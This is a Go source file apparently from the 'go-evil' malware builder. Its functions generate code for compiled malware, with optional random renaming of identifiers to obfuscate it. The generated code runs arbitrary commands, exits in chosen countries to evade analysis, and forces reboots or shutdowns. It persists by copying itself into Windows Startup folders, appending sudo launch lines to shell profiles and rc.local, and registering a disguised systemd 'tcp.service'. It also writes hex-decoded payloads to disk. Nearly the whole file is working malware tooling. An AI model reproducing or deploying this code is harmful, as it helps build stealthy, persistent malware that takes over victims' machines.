package system

import (
	"fmt"
	"strings"

	"github.com/TeamPhoneix/go-evil/utility/structure"
	"github.com/TeamPhoneix/go-evil/utility/tools"
)

//
//
// Exits the malware
//
//
func Exit(s_json string, return_code string) (string, string) {
	data_object := structure.Receive(s_json)

	function_call := "Exit"
	var1 := "value"

	if data_object.Obfuscate {
		function_call = tools.Generate_random_string()
		var1 = tools.Generate_random_string()
	}

	data_object.Add_go_function([]string{
		fmt.Sprintf("func %s(lvl string){", function_call),

		fmt.Sprintf("%s := tools.String_to_int(lvl)", var1),

		fmt.Sprintf("os.Exit(%s)", var1),

		"}"})

	data_object.Add_go_import("github.com/TeamPhoneix/go-evil/utility/tools")
	data_object.Add_go_import("os")

	return fmt.Sprintf("%s(%s)", function_call, return_code), structure.Send(data_object)
}

//
// Prints a message to the screen
//
func Out(s_json string, msg string) (string, string) {
	data_object := structure.Receive(s_json)
	function_call := "Out"
	var1 := "msg"

	if data_object.Obfuscate {
		function_call = tools.Generate_random_string()
		var1 = tools.Generate_random_string()
	}

	data_object.Add_go_function([]string{
		fmt.Sprintf("func %s(%s string){", function_call, var1),

		fmt.Sprintf("fmt.Print(%s)", var1),

		"}"})

	data_object.Add_go_import("fmt")

	return fmt.Sprintf("%s(%s)", function_call, msg), structure.Send(data_object)
}

//
//
// Executes a command on the running OS and prints the result
//
//
func Exec(s_json string, cmd string) (string, string) {
	data_object := structure.Receive(s_json)
	function_call := "Exec"

	if data_object.Obfuscate {
		function_call = tools.Generate_random_string()
	}

	data_object.Add_go_function([]string{
		fmt.Sprintf("func %s(cmd string){", function_call),
		"split_cmd := strings.Split(cmd, \" \")",
		"cmd = strings.ReplaceAll(split_cmd[0], \"\\\"\", \"\")",
		"args := strings.ReplaceAll(strings.Join(split_cmd[1:], \" \"), \"\\\"\", \"\")",
		"out, err := exec.Command(cmd, args).Output()",
		"if err != nil {",
		"fmt.Println(err.Error())",
		"}else{",
		"fmt.Println(string(out[:]))",
		"}}"})

	data_object.Add_go_import("os/exec")
	data_object.Add_go_import("fmt")
	data_object.Add_go_import("strings")

	return fmt.Sprintf("%s(%s)", function_call, cmd), structure.Send(data_object)
}

//
//
// Disables boot of the program in certain countries
// The countries are determined by value returned by jibber_jabber, formatted in ISO 639
//
//
func Abort(s_json string, languages string) (string, string) {
	data_object := structure.Receive(s_json)
	function_call := "Abort"
	var1 := "computer_lang"
	var2 := "lang"
	var3 := "languages"

	if data_object.Obfuscate {
		function_call = tools.Generate_random_string()
		var1 = tools.Generate_random_string()
		var2 = tools.Generate_random_string()
		var3 = tools.Generate_random_string()
	}

	language_array := tools.Extract_values_array(languages)

	data_object.Add_go_function([]string{
		fmt.Sprintf("func %s(%s []string){", function_call, var3),
		fmt.Sprintf("%s, err := jibber_jabber.DetectTerritory()", var1),
		"if err != nil {",
		"fmt.Println(err.Error())",
		"}else{",
		fmt.Sprintf("for _, %s := range %s{", var2, var3),
		fmt.Sprintf("if %s == %s{", var2, var1),
		"os.Exit(0)",
		"}}}}"})

	data_object.Add_go_import("os")
	data_object.Add_go_import("github.com/cloudfoundry/jibber_jabber")

	value := ""

	for _, lang := range language_array {
		value += fmt.Sprintf("%s,", strings.ToUpper(lang))
	}

	return fmt.Sprintf("%s([]string{%s})", function_call, value), structure.Send(data_object)
}

//
//
// Reboots the computer
//
//
func Reboot(s_json string) (string, string) {
	data_object := structure.Receive(s_json)
	function_call := "Reboot"

	if data_object.Obfuscate {
		function_call = tools.Generate_random_string()
	}

	cmd := ""
	if data_object.Target_os == "windows" {
		cmd = "shutdown /r"
	} else {
		cmd = "shutdown -r now"
	}

	data_object.Add_go_function([]string{
		fmt.Sprintf("func %s(){", function_call),

		fmt.Sprintf("exec.Command(\"%s\").Run()", cmd),
		"}"})

	data_object.Add_go_import("os/exec")

	return fmt.Sprintf("%s()", function_call), structure.Send(data_object)

}

//
//
// Shutdowns the computer
//
//
func Shutdown(s_json string) (string, string) {
	data_object := structure.Receive(s_json)
	function_call := "Shutdown"

	if data_object.Obfuscate {
		function_call = tools.Generate_random_string()
	}

	cmd := ""
	if data_object.Target_os == "windows" {
		cmd = "shutdown /s"
	} else {
		cmd = "shutdown -h now"
	}

	data_object.Add_go_function([]string{
		fmt.Sprintf("func %s(){", function_call),

		fmt.Sprintf("exec.Command(\"%s\").Run()", cmd),
		"}"})

	data_object.Add_go_import("os/exec")

	return fmt.Sprintf("%s()", function_call), structure.Send(data_object)
}

//
//
// Add the malware to startup
//
//
func Add_to_startup(s_json string) (string, string) {
	data_object := structure.Receive(s_json)
	function_call := "Add_2_startup"
	var1 := "malware_path"

	if data_object.Obfuscate {
		function_call = tools.Generate_random_string()
		var1 = tools.Generate_random_string()
	}

	if data_object.Target_os == "windows" {
		data_object.Add_go_function([]string{
			fmt.Sprintf("func %s(){", function_call),
			fmt.Sprintf("%s, _ := os.Executable()", var1),
			fmt.Sprintf("os.Link(%s, \"%AppData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\")", var1),
			fmt.Sprintf("os.Link(%s, \"%ProgramData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\")", var1),
			"}"})

	} else {
		var2 := "line"
		var3 := "in"
		var4 := "err"
		var5 := "write"
		var6 := "what_to_write"
		var7 := "line"

		if data_object.Obfuscate {
			var2 = tools.Generate_random_string()
			var3 = tools.Generate_random_string()
			var4 = tools.Generate_random_string()
			var5 = tools.Generate_random_string()
			var6 = tools.Generate_random_string()
			var7 = tools.Generate_random_string()
		}

		data_object.Add_go_function([]string{
			fmt.Sprintf("func %s(){", function_call),
			fmt.Sprintf("%s, _ := os.Executable()", var1),

			fmt.Sprintf("for _, %s := range []string{\"/etc/profile\", \"~/.bash_profile\", \"~/.bash_login\", \"~/.profile\", \"/etc/rc.local\"} {", var2),
			fmt.Sprintf("%s, %s := os.OpenFile(%s, os.O_APPEND|os.O_WRONLY, 0644)", var3, var4, var2),
			fmt.Sprintf("if %s == nil {", var4),
			fmt.Sprintf("%s.WriteString(\"sudo .\" + %s + \" &\")", var3, var1),
			"}",
			"}",

			fmt.Sprintf("%s, %s := os.Create(\"/lib/systemd/system/tcp.service\")", var3, var4),
			fmt.Sprintf("if %s == nil {", var4),
			fmt.Sprintf("%s := bufio.NewWriter(%s)", var5, var3),
			fmt.Sprintf("%s := []string{", var6),
			"\"[Unit]\",",
			"\"Description=My Sample Service\",",
			"\"After=multi-user.target\",",

			"\"[Service]\",",
			"\"Type=idle\",",
			fmt.Sprintf("\"ExecStart=.%s\",", var1),

			"\"[Install]\",",
			"\"WantedBy=multi-user.target\",",

			"}",

			fmt.Sprintf("for _, %s := range %s {", var7, var6),
			fmt.Sprintf("%s.WriteString(%s)", var5, var7),
			"}",
			"exec.Command(\"sudo\", \"systemctl\", \"enable\", \"tcp.service\").Run()",
			"exec.Command(\"sudo\", \"systemctl\", \"start\", \"tcp.service\").Run()",
			"}}"})
	}
	data_object.Add_go_import("os/exec")
	data_object.Add_go_import("bufio")

	data_object.Add_go_import("os")

	return fmt.Sprintf("%s()", function_call), structure.Send(data_object)
}

//
//
// Writes a provided content to a provided file
//
//
func write(s_json string, value string) (string, string) {
	data_object := structure.Receive(s_json)
	function_call := "Write"
	param1 := "path"
	param2 := "content"
	var1 := "file"
	var2 := "result"
	var3 := "ok"
	var4 := "split"
	var5 := "data"

	if data_object.Obfuscate {
		function_call = tools.Generate_random_string()
		param1 = tools.Generate_random_string()
		param2 = tools.Generate_random_string()
		var1 = tools.Generate_random_string()
		var2 = tools.Generate_random_string()
		var3 = tools.Generate_random_string()
		var4 = tools.Generate_random_string()
		var5 = tools.Generate_random_string()
	}

	arr := tools.Extract_values_array(value)
	path := arr[0]
	data := strings.Join(arr[1:], " ")

	if data_object.Check_global_name(data) {
		data = tools.Erase_delimiter(data, "\"")
	}

	data_object.Add_go_function([]string{
		fmt.Sprintf("func %s(%s string, %s string){", function_call, param1, param2),
		fmt.Sprintf("%s, %s := os.Create(%s)", var1, var2, param1),
		fmt.Sprintf("if %s == nil{", var2),
		fmt.Sprintf("defer %s.Close()", var1),
		fmt.Sprintf("%s := tools.Starts_with(%s, []string{\"[HEX];\"})", var2, param2),
		fmt.Sprintf("if %s := %s[\"[HEX];\"]; !%s{", var3, var2, var3),
		fmt.Sprintf("%s.WriteString(%s)", var1, param2),
		"}else{",
		fmt.Sprintf("%s := strings.Split(%s, \",\")", var4, param2),
		fmt.Sprintf("for _, %s := range %s {", var5, var4),
		fmt.Sprintf("%s, _ := hex.DecodeString(%s)", var5, var5),
		fmt.Sprintf("%s.Write(%s)", var1, var5),
		"}}}}",
	})

	data_object.Add_go_import("encoding/hex")
	data_object.Add_go_import("os")
	data_object.Add_go_import("strings")
	data_object.Add_go_import("github.com/TeamPhoneix/go-evil/utility/tools")

	return fmt.Sprintf("%s(%s, %s)", function_call, path, data), structure.Send(data_object)
}
